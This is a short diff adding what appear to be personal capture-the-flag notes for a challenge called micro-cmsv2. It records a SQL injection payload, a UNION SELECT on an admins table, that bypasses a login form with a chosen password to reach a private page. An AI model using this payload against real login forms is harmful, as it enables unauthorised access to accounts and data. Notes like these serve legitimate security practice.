@@ -1,0 +1,5 @@
+name: micro-cmsv2
+1.we can see login, review source code and view form php connect database
+test' UNION SELECT "pass" as password FROM admins WHERE '1'='1
+pass
+1.1 later to private page
